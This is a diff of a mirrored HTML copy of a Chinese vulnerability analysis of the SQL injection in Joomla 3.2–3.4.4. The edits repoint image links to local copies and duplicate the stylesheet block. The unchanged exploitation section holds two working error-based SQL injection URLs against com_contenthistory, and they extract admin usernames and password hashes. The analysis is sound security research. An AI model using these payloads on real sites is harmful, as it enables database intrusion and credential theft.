@@ -3,7 +3,7 @@
 			<head>
 			     <title>Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析 - RickGray</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/9979">http://drops.wooyun.org/papers/9979</a></h1>
 				
@@ -210,7 +210,7 @@ protected function populateState($ordering = null, $direction = null)
 
 <p>因此，访问上述构造的URL，服务器会报错：</p>
 
-<p><img src="http://static.wooyun.org//drops/20151026/2015102603113434189112.jpg" alt=""></p>
+<p><img src="../images_result/images/2015102603113434189112.jpg" alt=""></p>
 
 <p><em>2.漏洞利用</em></p>
 
@@ -226,13 +226,13 @@ protected function populateState($ordering = null, $direction = null)
   <p>http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com&#95;contenthistory&amp;view=history&amp;item&#95;id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(<em>),concat((select username from %23__users limit 0,1),floor(rand(0)</em>2)) from information_schema.tables group by 2)x)</p>
 </blockquote>
 
-<p><img src="http://static.wooyun.org//drops/20151026/201510260313109957323.jpg" alt=""></p>
+<p><img src="../images_result/images/201510260313109957323.jpg" alt=""></p>
 
 <blockquote>
   <p>http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com&#95;contenthistory&amp;view=history&amp;item&#95;id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(<em>),concat((select password from %23__users limit 0,1),floor(rand(0)</em>2)) from information_schema.tables group by 2)x)</p>
 </blockquote>
 
-<p><img src="http://static.wooyun.org//drops/20151026/201510260314099861138.jpg" alt=""></p>
+<p><img src="../images_result/images/201510260314099861138.jpg" alt=""></p>
 
 <h1>0x03 修复方案</h1>
 
